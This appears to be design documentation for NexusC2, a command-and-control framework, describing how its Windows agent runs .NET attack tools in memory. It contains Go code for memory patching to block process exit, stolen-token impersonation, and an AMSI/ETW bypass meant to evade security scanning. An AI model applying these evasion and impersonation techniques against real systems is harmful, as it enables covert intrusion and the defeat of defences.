# .NET Assembly Execution

## Overview

NexusC2 supports in-memory execution of .NET assemblies (EXE and DLL) directly within the agent process. This capability allows running .NET tools like Rubeus, Seatbelt, SharpHound, and custom tooling without dropping files to disk.

**Key Features:**
- In-memory CLR hosting and assembly loading
- Support for .NET Framework 2.0/4.0+ assemblies
- Synchronous and asynchronous execution modes
- Exit prevention to protect agent stability
- Output capture via file redirection
- Token impersonation support

**Platform:** Windows only

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                   ASSEMBLY EXECUTION FLOW                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  GUI Client                                                     │
│      │                                                          │
│      │ 1. Select assembly + arguments                           │
│      ▼                                                          │
│  WebSocket Service                                              │
│      │  - Base64 encode assembly bytes                          │
│      │  - Package as JSON configuration                         │
│      │  - Queue as inline-assembly command                      │
│      ▼                                                          │
│  Agent (Windows Payload)                                        │
│      │  - Initialize exit prevention patches                    │
│      │  - Apply token context if impersonating                  │
│      │  - Initialize COM (CoInitializeEx)                       │
│      │  - Create output capture mechanism                       │
│      │  - Load CLR runtime (v2 or v4)                           │
│      │  - Execute assembly entry point                          │
│      │  - Capture stdout/stderr                                 │
│      │  - Restore original handles                              │
│      ▼                                                          │
│  Server                                                         │
│      │  - Receive output in POST results                        │
│      │  - Display to GUI client                                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## CLR Loading

### Runtime Selection

The agent automatically detects the required .NET runtime version:

| Runtime | Detection | Usage |
|---------|-----------|-------|
| v4.x | Default | Most modern .NET assemblies |
| v2.0.50727 | Contains "v2.0.50727" string | Legacy .NET 2.0/3.5 assemblies |

### CLR Hosting

The agent uses the `go-buena-clr` library for CLR hosting:

```go
import clr "github.com/almounah/go-buena-clr"

// Execute assembly in-memory
retCode, err := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)
```

### COM Initialization

COM must be initialized before CLR operations:

```go
hr, _, _ := coInitializeEx.Call(0, COINIT_MULTITHREADED)
if hr == 0 {
    defer coUninitialize.Call()
}
```

---

## Exit Prevention

### Overview

.NET assemblies may call `Environment.Exit()` or similar methods which would terminate the agent process. The exit prevention system patches these methods to prevent process termination.

### Patched Methods

| Method | Library | Purpose |
|--------|---------|---------|
| Environment.Exit | mscorlib/clr.dll | Primary .NET exit method |
| Application.Exit | System.Windows.Forms | WinForms application exit |
| Process.Kill | mscorlib | Process termination |
| ExitProcess | kernel32.dll | Native process exit |
| TerminateProcess | kernel32.dll | Native process termination |

### Patching Technique

Based on MDSec's CLR exit prevention technique:

```go
// Save original bytes
original := make([]byte, 5)
for i := 0; i < 5; i++ {
    original[i] = *(*byte)(unsafe.Pointer(addr + uintptr(i)))
}

// Change memory protection
virtualProtect.Call(addr, 5, PAGE_EXECUTE_READWRITE, ...)

// Patch with RET instruction
*(*byte)(unsafe.Pointer(addr)) = 0xC3  // RET

// Restore protection
virtualProtect.Call(addr, 5, oldProtect, ...)
```

### TerminateProcess Patch

For `TerminateProcess`, a more complex patch returns success without terminating:

```asm
; x64 version
XOR RAX, RAX   ; 48 31 C0
INC RAX        ; 48 FF C0  (return 1/TRUE)
RET            ; C3

; x86 version
XOR EAX, EAX   ; 31 C0
INC EAX        ; 40  (return 1/TRUE)
RET            ; C3
```

---

## Output Capture

### Strategy: File Redirection

The most stable output capture method uses temporary file redirection:

```go
func executeWithFileCapture(assemblyBytes []byte, arguments []string) (string, int, error) {
    // Create temp file
    outputFile := filepath.Join(os.TempDir(), "clr_output_"+timestamp+".txt")

    // Create file handle
    fileHandle, _, _ := createFileW.Call(
        outputPath,
        GENERIC_WRITE|GENERIC_READ,
        FILE_SHARE_READ|FILE_SHARE_WRITE,
        0,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        0,
    )

    // Save and redirect handles
    origStdout, _, _ := getStdHandle.Call(STD_OUTPUT_HANDLE)
    origStderr, _, _ := getStdHandle.Call(STD_ERROR_HANDLE)
    setStdHandle.Call(STD_OUTPUT_HANDLE, fileHandle)
    setStdHandle.Call(STD_ERROR_HANDLE, fileHandle)

    // Execute assembly
    retCode, err := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)

    // Restore handles
    setStdHandle.Call(STD_OUTPUT_HANDLE, origStdout)
    setStdHandle.Call(STD_ERROR_HANDLE, origStderr)

    // Read captured output
    output, _ := os.ReadFile(outputFile)
    return string(output), retCode, err
}
```

### Strategy: Pipe Capture

Alternatively, output can be captured via anonymous pipes:

```go
func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, int, error) {
    // Create pipe with large buffer
    var readPipe, writePipe syscall.Handle
    syscall.CreatePipe(&readPipe, &writePipe, nil, 1024*1024)

    // Redirect stdout/stderr to write pipe
    setStdHandle.Call(STD_OUTPUT_HANDLE, uintptr(writePipe))
    setStdHandle.Call(STD_ERROR_HANDLE, uintptr(writePipe))

    // Also redirect CRT file descriptors
    fd, _, _ := openOsfhandle.Call(uintptr(writePipe), 0x8000)
    dup2.Call(fd, 1)  // stdout
    dup2.Call(fd, 2)  // stderr

    // Execute assembly
    retCode, err := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)

    // Close write end and read all output
    syscall.CloseHandle(writePipe)
    // ... read from readPipe ...
}
```

---

## Token Context

### Impersonation Support

Assemblies can execute under impersonated token contexts:

| Token Type | Behavior |
|------------|----------|
| No impersonation | Runs as agent process identity |
| Regular impersonation | Uses active stolen/created token |
| Network-only token | Uses token for network operations |

### Token Application

```go
func applyTokenContextForInlineAssembly() func() {
    if globalTokenStore.NetOnlyHandle != 0 {
        // Apply network-only token
        ImpersonateLoggedOnUser(globalTokenStore.NetOnlyHandle)
        return func() { RevertToSelf() }
    } else if globalTokenStore.IsImpersonating {
        // Apply regular token
        ImpersonateLoggedOnUser(globalTokenStore.Tokens[activeToken])
        return func() { RevertToSelf() }
    }
    return func() {} // No-op
}
```

**Note:** Token context is applied BEFORE COM initialization to ensure the CLR runs under the correct identity.

---

## Command Configuration

### JSON Format

```json
{
  "assembly_b64": "<base64 encoded assembly>",
  "arguments": ["arg1", "arg2"],
  "app_domain": "CustomDomain",
  "bypass_amsi": true,
  "bypass_etw": false,
  "revert_etw": false,
  "entry_point": "Main",
  "use_pipe": false,
  "pipe_name": ""
}
```

### Configuration Options

| Option | Description |
|--------|-------------|
| `assembly_b64` | Base64-encoded assembly bytes |
| `arguments` | Command-line arguments array |
| `app_domain` | Custom AppDomain name (optional) |
| `bypass_amsi` | Patch AMSI before execution |
| `bypass_etw` | Disable ETW tracing |
| `revert_etw` | Restore ETW after execution |
| `entry_point` | Custom entry point method |
| `use_pipe` | Use named pipe for output |
| `pipe_name` | Named pipe name |

---

## Synchronous Execution

### Command Type

```json
{
  "command_type": 18,
  "command": "inline-assembly",
  "data": "<JSON configuration>"
}
```

### Execution Flow

1. Parse JSON configuration
2. Base64 decode assembly bytes
3. Detect assembly type (EXE vs DLL)
4. Initialize exit prevention (once)
5. Apply AMSI bypass if requested
6. Apply token context
7. Initialize COM
8. Setup output capture
9. Load and execute assembly
10. Capture exit code
11. Read captured output
12. Restore handles
13. Return result

---

## Asynchronous Execution

### Command Type

```json
{
  "command_type": 19,
  "command": "inline-assembly-async",
  "data": "<JSON configuration>"
}
```

### Job Management

Async assemblies run as tracked jobs:

```go
type AssemblyJob struct {
    ID          string
    CommandID   string
    CommandDBID int
    AgentID     string
    Name        string
    Status      string  // running, completed, failed, killed
    StartTime   time.Time
    EndTime     *time.Time
    Output      strings.Builder
    Error       error
    CancelChan  chan bool
}
```

### Job Status Values

| Status | Description |
|--------|-------------|
| `running` | Assembly is executing |
| `completed` | Finished successfully |
| `failed` | Execution error occurred |
| `killed` | Manually terminated |

### Job Commands

| Command | Description |
|---------|-------------|
| `inline-assembly-jobs` | List all assembly jobs |
| `inline-assembly-output <id>` | Get job output |
| `inline-assembly-kill <id>` | Kill running job |

---

## Assembly Detection

### EXE vs DLL Detection

The agent checks PE headers to determine assembly type:

```go
func (c *InlineAssemblyCommand) isDLLAssembly(assemblyBytes []byte) bool {
    // Check for MZ header
    if assemblyBytes[0] != 'M' || assemblyBytes[1] != 'Z' {
        return false
    }

    // Get PE header offset from 0x3C
    peOffset := int32(assemblyBytes[0x3C]) | ...

    // Check IMAGE_FILE_DLL flag (0x2000) in Characteristics
    characteristics := uint16(assemblyBytes[peOffset+0x16]) | ...
    return (characteristics & 0x2000) != 0
}
```

---

## Thread Safety

### OS Thread Locking

Assembly execution requires thread locking for COM and CLR:

```go
runtime.LockOSThread()
defer runtime.UnlockOSThread()
```

### Execution Mutex

Synchronous executions are serialized:

```go
var clrExecutionMutex sync.Mutex

func (c *InlineAssemblyCommand) Execute(...) {
    clrExecutionMutex.Lock()
    clrExecutionCount++
    clrExecutionMutex.Unlock()
    // ...
}
```

---

## Error Handling

### Error Codes

| Code | Description |
|------|-------------|
| E42 | Windows-only feature |
| E43 | No assembly data provided |
| E44 | Invalid JSON configuration |
| E45 | Base64 decode failed |
| E46 | Assembly execution failed |
| E52 | Assembly crashed/panic |

### Panic Recovery

Async execution includes panic recovery:

```go
defer func() {
    if r := recover(); r != nil {
        job.Status = "failed"
        job.Error = fmt.Errorf("Assembly crashed: %v", r)
        // Send crash result
    }
}()
```

---

## AMSI Bypass

### Overview

When `bypass_amsi` is enabled, the agent patches the AmsiScanBuffer function:

```go
func patchAMSI() {
    // Load amsi.dll
    // Find AmsiScanBuffer
    // Patch first bytes with return AMSI_RESULT_CLEAN
}
```

This prevents AMSI from scanning loaded assemblies.

---

## Limitations

| Limitation | Description |
|------------|-------------|
| Platform | Windows only |
| CLR State | Multiple executions may corrupt CLR state |
| Output Capture | Some assemblies may bypass capture |
| Exit Prevention | Not 100% reliable for all exit methods |
| Memory | CLR remains loaded after first use |
| Concurrency | Synchronous execution is serialized |

### CLR State Warning

Running multiple .NET assemblies may cause CLR state corruption. If assemblies fail unexpectedly:
1. The CLR may have corrupted global state
2. Consider restarting the agent
3. Use async execution for long-running tools

---

## Related Files

| Component | File Path |
|-----------|-----------|
| Core Implementation | `server/docker/payloads/Windows/inline_assembly.go` |
| Windows Platform | `server/docker/payloads/Windows/action_inline_assembly.go` |
| Async Execution | `server/docker/payloads/Windows/action_inline_assembly_async.go` |
| Job Management | `server/docker/payloads/Windows/action_inline_assembly_async_jobs.go` |
| Exit Prevention | `server/docker/payloads/Windows/clr_exit_prevention.go` |
